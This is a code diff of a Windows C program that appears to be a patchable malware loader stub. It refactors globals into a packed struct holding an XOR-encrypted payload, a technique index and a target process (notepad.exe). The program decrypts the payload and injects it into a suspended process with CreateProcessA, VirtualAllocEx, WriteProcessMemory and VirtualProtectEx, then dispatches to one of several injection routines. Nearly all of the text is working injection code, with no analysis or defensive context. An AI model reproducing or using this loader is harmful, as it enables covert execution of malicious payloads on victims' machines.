@@ -1,18 +1,32 @@
 #include <windows.h>
 
 #define PAYLOAD_MARKER 0xDEADBEEF
+#define MAX_PAYLOAD_SIZE 8192
+#define MAX_PROCESS_NAME 256
 
-DWORD payload_size = PAYLOAD_MARKER;
-unsigned char payload[8192];
-unsigned char xor_key = 0;
-unsigned char technique = 0;
-char target_process[256] = "notepad.exe";
+#pragma pack(push, 1)
+typedef struct {
+	DWORD payload_size;
+	unsigned char payload[MAX_PAYLOAD_SIZE];
+	unsigned char xor_key;
+	unsigned char technique;
+	char target_process[MAX_PROCESS_NAME];
+} PatchData;
+#pragma pack(pop)
+
+PatchData patch_data = {
+	PAYLOAD_MARKER,
+	{0},
+	0,
+	0,
+	"notepad.exe"
+};
 
 void decrypt_payload() {
 	DWORD i;
-	if (xor_key != 0) {
-		for (i = 0; i < payload_size; i++) {
-			payload[i] ^= xor_key;
+	if (patch_data.xor_key != 0) {
+		for (i = 0; i < patch_data.payload_size; i++) {
+			patch_data.payload[i] ^= patch_data.xor_key;
 		}
 	}
 }
@@ -24,11 +38,11 @@ void inject_create_remote_thread() {
 	HANDLE hThread;
 	DWORD old;
 
-	if (!CreateProcessA(NULL, target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+	if (!CreateProcessA(NULL, patch_data.target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
 		return;
 	}
 
-	buf = VirtualAllocEx(pi.hProcess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	buf = VirtualAllocEx(pi.hProcess, NULL, patch_data.payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!buf) {
 		TerminateProcess(pi.hProcess, 0);
 		CloseHandle(pi.hProcess);
@@ -36,7 +50,7 @@ void inject_create_remote_thread() {
 		return;
 	}
 
-	if (!WriteProcessMemory(pi.hProcess, buf, payload, payload_size, NULL)) {
+	if (!WriteProcessMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL)) {
 		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
 		TerminateProcess(pi.hProcess, 0);
 		CloseHandle(pi.hProcess);
@@ -44,7 +58,7 @@ void inject_create_remote_thread() {
 		return;
 	}
 
-	if (!VirtualProtectEx(pi.hProcess, buf, payload_size, PAGE_EXECUTE_READ, &old)) {
+	if (!VirtualProtectEx(pi.hProcess, buf, patch_data.payload_size, PAGE_EXECUTE_READ, &old)) {
 		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
 		TerminateProcess(pi.hProcess, 0);
 		CloseHandle(pi.hProcess);
@@ -90,6 +104,6 @@ InjectionFunc injection_techniques[] = {
 
 int main() {
 	decrypt_payload();
-	injection_techniques[technique]();
+	injection_techniques[patch_data.technique]();
 	return 0;
 }
